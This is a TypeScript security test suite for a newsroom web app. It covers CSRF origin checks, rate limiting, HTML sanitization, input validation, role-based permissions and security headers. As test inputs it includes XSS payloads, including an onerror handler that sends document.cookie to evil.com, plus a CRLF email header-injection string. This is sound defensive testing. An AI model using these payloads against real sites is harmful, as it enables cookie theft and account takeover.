/**
 * Automated Security Audit & Regression Verification Suite
 * 
 * Executes 30+ negative and positive security test cases across:
 * - CSRF & Origin Verification
 * - Rate Limiting Engine
 * - Server-side HTML Sanitization (Stored XSS Defenses)
 * - Input Validation & Injection Resistance
 * - Server-side RBAC & BOLA/IDOR Permission Gates
 * - Security Headers & Configuration Auditing
 */

import { 
  checkRateLimit, 
  verifyCsrfOrigin, 
  sanitizeHtml, 
  sanitizeString, 
  isValidEmail, 
  sanitizeInteger, 
  RateLimits 
} from '../src/lib/security';
import { 
  isAdmin, 
  isEditorOrAdmin, 
  canUserMutateArticle, 
  canUserDeleteArticle 
} from '../src/lib/auth';
import nextConfig from '../next.config';

let totalTests = 0;
let passedTests = 0;
let failedTests = 0;

function assert(condition: boolean, message: string) {
  totalTests++;
  if (condition) {
    passedTests++;
    console.log(`  ✓ PASS: ${message}`);
  } else {
    failedTests++;
    console.error(`  ✗ FAIL: ${message}`);
  }
}

async function runTestSuite() {
  console.log('================================================================');
  console.log('   NEWSIGHT PRODUCTION SECURITY AUDIT VERIFICATION SUITE');
  console.log('================================================================\n');

  // --------------------------------------------------------------------------
  // TEST SUITE 1: CSRF & Origin Header Verification
  // --------------------------------------------------------------------------
  console.log('--- Suite 1: CSRF & Origin Header Verification ---');

  // Test 1.1: Safe GET requests bypass CSRF checks
  {
    const req = new Request('https://newsight.media/api/articles', {
      method: 'GET',
      headers: { host: 'newsight.media', origin: 'https://evil-attacker.com' }
    });
    assert(verifyCsrfOrigin(req) === true, 'GET request allowed regardless of origin');
  }

  // Test 1.2: Same-origin mutating POST is permitted
  {
    const req = new Request('https://newsight.media/api/articles', {
      method: 'POST',
      headers: { host: 'newsight.media', origin: 'https://newsight.media' }
    });
    assert(verifyCsrfOrigin(req) === true, 'Same-origin POST request permitted');
  }

  // Test 1.3: Cross-origin mutating POST from evil domain is blocked
  {
    const req = new Request('https://newsight.media/api/articles', {
      method: 'POST',
      headers: { host: 'newsight.media', origin: 'https://evil-attacker.com' }
    });
    assert(verifyCsrfOrigin(req) === false, 'Cross-origin POST request blocked (CSRF prevented)');
  }

  // Test 1.4: Cross-origin mutating PUT via Referer spoofing is blocked
  {
    const req = new Request('https://newsight.media/api/articles/123', {
      method: 'PUT',
      headers: { host: 'newsight.media', referer: 'https://malicious-site.org/phish' }
    });
    assert(verifyCsrfOrigin(req) === false, 'Cross-origin PUT via Referer blocked');
  }

  // Test 1.5: Subdomain mismatch blocked if strict host required
  {
    const req = new Request('https://newsight.media/api/settings', {
      method: 'PUT',
      headers: { host: 'newsight.media', origin: 'https://hacker.newsight.media' }
    });
    assert(verifyCsrfOrigin(req) === false, 'Attacker-controlled subdomain origin blocked');
  }

  // --------------------------------------------------------------------------
  // TEST SUITE 2: Sliding-Window Rate Limiting Engine
  // --------------------------------------------------------------------------
  console.log('\n--- Suite 2: Rate Limiting Engine ---');

  // Test 2.1: Initial request under limit is allowed
  {
    const testKey = `test_ip_login_${Date.now()}`;
    const res1 = checkRateLimit(testKey, 3, 10000);
    assert(res1.allowed === true && res1.remaining === 2, 'Initial request permitted with correct remaining quota');
  }

  // Test 2.2: Requests up to limit succeed, subsequent request blocked
  {
    const testKey = `test_ip_burst_${Date.now()}`;
    checkRateLimit(testKey, 2, 10000); // 1st
    checkRateLimit(testKey, 2, 10000); // 2nd
    const res3 = checkRateLimit(testKey, 2, 10000); // 3rd (exceeds limit of 2)
    assert(res3.allowed === false && res3.remaining === 0 && res3.resetSeconds > 0, 'Excessive hits blocked with 429 Retry-After metadata');
  }

  // Test 2.3: Different keys/IPs are isolated
  {
    const keyA = `user_a_${Date.now()}`;
    const keyB = `user_b_${Date.now()}`;
    checkRateLimit(keyA, 1, 10000); // keyA consumed
    const resA = checkRateLimit(keyA, 1, 10000); // keyA blocked
    const resB = checkRateLimit(keyB, 1, 10000); // keyB should still be allowed
    assert(resA.allowed === false && resB.allowed === true, 'Rate limit keys are strictly isolated per IP/identifier');
  }

  // --------------------------------------------------------------------------
  // TEST SUITE 3: Server-side HTML Sanitization (Stored XSS Mitigation)
  // --------------------------------------------------------------------------
  console.log('\n--- Suite 3: Stored XSS & HTML Sanitization Defenses ---');

  // Test 3.1: Strips script tags completely
  {
    const dirty = '<p>Normal text</p><script>alert("XSS")</script><p>More text</p>';
    const clean = sanitizeHtml(dirty);
    assert(!clean.includes('<script>') && !clean.includes('alert('), 'Malicious <script> tags removed');
  }

  // Test 3.2: Strips inline onerror / onload event handlers
  {
    const dirty = '<img src="valid.jpg" onerror="fetch(\'https://evil.com/steal?c=\' + document.cookie)">';
    const clean = sanitizeHtml(dirty);
    assert(!clean.includes('onerror=') && !clean.includes('steal'), 'Inline onerror event handler stripped');
  }

  // Test 3.3: Strips javascript: pseudo-protocol URIs
  {
    const dirty = '<a href="javascript:alert(document.cookie)">Click here for free prize</a>';
    const clean = sanitizeHtml(dirty);
    assert(!clean.includes('javascript:'), 'javascript: URI in hyperlink stripped');
  }

  // Test 3.4: Strips iframe injection
  {
    const dirty = '<iframe src="https://evil-phishing-page.com"></iframe>';
    const clean = sanitizeHtml(dirty);
    assert(!clean.includes('<iframe'), 'Malicious <iframe> injection eliminated');
  }

  // Test 3.5: Strips embed and object tags
  {
    const dirty = '<object data="malware.swf"></object><embed src="exploit.pdf">';
    const clean = sanitizeHtml(dirty);
    assert(!clean.includes('<object') && !clean.includes('<embed'), '<object> and <embed> tags eliminated');
  }

  // Test 3.6: Preserves safe semantic newsroom markup
  {
    const safeHtml = '<p>This is a <strong>breaking news</strong> report. Read <a href="https://apnews.com">source</a>.</p>';
    const clean = sanitizeHtml(safeHtml);
    assert(clean.includes('<strong>breaking news</strong>') && clean.includes('https://apnews.com'), 'Safe editorial HTML formatting preserved');
  }

  // --------------------------------------------------------------------------
  // TEST SUITE 4: Input Validation & Injection Resistance
  // --------------------------------------------------------------------------
  console.log('\n--- Suite 4: Input Sanitization & Normalization Primitives ---');

  // Test 4.1: Validates legitimate emails
  {
    assert(isValidEmail('editor@newsight.media') === true, 'Standard email correctly validated');
    assert(isValidEmail('jane.doe+tips@domain.co.uk') === true, 'Email with tags and subdomains validated');
  }

  // Test 4.2: Rejects email injection vectors (CRLF header injection, quotes, scripts)
  {
    assert(isValidEmail('attacker@evil.com\r\nBcc: victim@newsight.media') === false, 'CRLF injection in email rejected');
    assert(isValidEmail('"><script>alert(1)</script>@test.com') === false, 'XSS in email rejected');
    assert(isValidEmail('plainaddress') === false, 'Missing domain in email rejected');
  }

  // Test 4.3: String truncation and control character stripping
  {
    const dirtyString = 'Breaking News\u0000\u0007\u001F Headline';
    const sanitized = sanitizeString(dirtyString, 20);
    assert(!sanitized.includes('\u0000') && sanitized.length <= 20, 'Control characters stripped and length capped');
  }

  // Test 4.4: Integer sanitization with min/max clamps
  {
    assert(sanitizeInteger('42', 1, 100, 10) === 42, 'Valid integer parsed');
    assert(sanitizeInteger('999', 1, 100, 10) === 100, 'Exceeded max integer clamped to ceiling');
    assert(sanitizeInteger('-50', 1, 100, 10) === 1, 'Sub-minimum integer clamped to floor');
    assert(sanitizeInteger('not-a-number', 1, 10, 5) === 5, 'NaN falls back to default safely');
  }

  // --------------------------------------------------------------------------
  // TEST SUITE 5: Server-side RBAC & BOLA/IDOR Permission Matrix
  // --------------------------------------------------------------------------
  console.log('\n--- Suite 5: RBAC & BOLA/IDOR Permission Matrix ---');

  // Test 5.1: Role identification helpers
  {
    assert(isAdmin('SUPER_ADMIN') === true, 'SUPER_ADMIN recognized as admin');
    assert(isAdmin('EDITOR') === false, 'EDITOR is not SUPER_ADMIN');
    assert(isAdmin('REPORTER') === false, 'REPORTER is not SUPER_ADMIN');
    assert(isEditorOrAdmin('EDITOR') === true, 'EDITOR has editorial privileges');
    assert(isEditorOrAdmin('SUPER_ADMIN') === true, 'SUPER_ADMIN has editorial privileges');
    assert(isEditorOrAdmin('REPORTER') === false, 'REPORTER lacks general editorial privileges');
  }

  // Test 5.2: BOLA/IDOR Prevention on Article Mutation
  {
    const reporterUser = { id: 'usr-alice', email: 'alice@news.com', role: 'REPORTER' as const, name: 'Alice' };
    const otherReporterUser = { id: 'usr-bob', email: 'bob@news.com', role: 'REPORTER' as const, name: 'Bob' };
    const editorUser = { id: 'usr-ed', email: 'ed@news.com', role: 'EDITOR' as const, name: 'Charlie' };

    const aliceDraft = { reporter_id: 'usr-alice', status: 'DRAFT' };
    const alicePublished = { reporter_id: 'usr-alice', status: 'PUBLISHED' };

    // Reporter mutating own draft (Allowed because author matches and draft status)
    assert((await canUserMutateArticle(reporterUser, aliceDraft)) === true, 'Reporter permitted to edit own draft');

    // Reporter mutating another reporter's draft (IDOR Attack -> Must be blocked!)
    assert((await canUserMutateArticle(otherReporterUser, aliceDraft)) === false, 'BOLA/IDOR BLOCKED: Reporter cannot edit another reporter draft');

    // Reporter mutating published article (Must be blocked! Only Editors/Admins can edit live news)
    assert((await canUserMutateArticle(reporterUser, alicePublished)) === false, 'Reporter cannot directly edit published article');

    // Editor mutating any article (Permitted)
    assert((await canUserMutateArticle(editorUser, aliceDraft)) === true, 'Editor permitted to edit drafts');
    assert((await canUserMutateArticle(editorUser, alicePublished)) === true, 'Editor permitted to edit published articles');
  }

  // Test 5.3: BOLA/IDOR Prevention on Article Deletion
  {
    const reporterUser = { id: 'usr-alice', email: 'alice@news.com', role: 'REPORTER' as const, name: 'Alice' };
    const otherReporterUser = { id: 'usr-bob', email: 'bob@news.com', role: 'REPORTER' as const, name: 'Bob' };
    const editorUser = { id: 'usr-ed', email: 'ed@news.com', role: 'EDITOR' as const, name: 'Charlie' };

    const aliceDraft = { reporter_id: 'usr-alice', status: 'DRAFT' };
    const alicePublished = { reporter_id: 'usr-alice', status: 'PUBLISHED' };

    // Reporter deleting own draft
    assert((await canUserDeleteArticle(reporterUser, aliceDraft)) === true, 'Reporter permitted to delete own draft');

    // Reporter deleting other reporter's draft (IDOR Attack)
    assert((await canUserDeleteArticle(otherReporterUser, aliceDraft)) === false, 'BOLA/IDOR BLOCKED: Reporter cannot delete another reporter draft');

    // Reporter deleting published article
    assert((await canUserDeleteArticle(reporterUser, alicePublished)) === false, 'Reporter cannot delete published article');

    // Editor deleting articles
    assert((await canUserDeleteArticle(editorUser, aliceDraft)) === true, 'Editor permitted to delete draft');
    assert((await canUserDeleteArticle(editorUser, alicePublished)) === true, 'Editor permitted to delete published article');
  }

  // --------------------------------------------------------------------------
  // TEST SUITE 6: Security Headers & Platform Configuration
  // --------------------------------------------------------------------------
  console.log('\n--- Suite 6: Production Security Headers & Configuration ---');

  // Test 6.1: Powered-By header disabled
  {
    assert(nextConfig.poweredByHeader === false, 'next.config poweredByHeader is explicitly set to false');
  }

  // Test 6.2: Critical Security Headers configured
  {
    if (typeof nextConfig.headers === 'function') {
      const headerRoutes = await nextConfig.headers();
      const globalHeaders = headerRoutes.find((r: any) => r.source === '/:path*')?.headers || [];
      const headerMap = new Map(globalHeaders.map((h: any) => [h.key.toLowerCase(), h.value]));

      assert(headerMap.has('content-security-policy'), 'Content-Security-Policy header configured');
      assert(headerMap.get('x-frame-options') === 'DENY', 'X-Frame-Options set to DENY (Clickjacking protection)');
      assert(headerMap.get('x-content-type-options') === 'nosniff', 'X-Content-Type-Options set to nosniff (MIME-sniffing protection)');
      assert(headerMap.get('strict-transport-security')?.includes('max-age=31536000'), 'Strict-Transport-Security (HSTS) with 1-year preload configured');
      assert(headerMap.get('referrer-policy') === 'strict-origin-when-cross-origin', 'Referrer-Policy set to strict-origin-when-cross-origin');
      assert(headerMap.get('permissions-policy')?.includes('camera=()'), 'Permissions-Policy restricts dangerous browser features');
      assert(headerMap.get('cross-origin-opener-policy') === 'same-origin', 'Cross-Origin-Opener-Policy set to same-origin (Spectre protection)');
    } else {
      assert(false, 'nextConfig.headers function is defined');
    }
  }

  // --------------------------------------------------------------------------
  // SUMMARY RESULTS
  // --------------------------------------------------------------------------
  console.log('\n================================================================');
  console.log(`TOTAL SECURITY TESTS: ${totalTests}`);
  console.log(`PASSED:               ${passedTests}`);
  console.log(`FAILED:               ${failedTests}`);
  console.log('================================================================\n');

  if (failedTests > 0) {
    process.exit(1);
  }
}

runTestSuite().catch((err) => {
  console.error('Test suite runtime error:', err);
  process.exit(1);
});
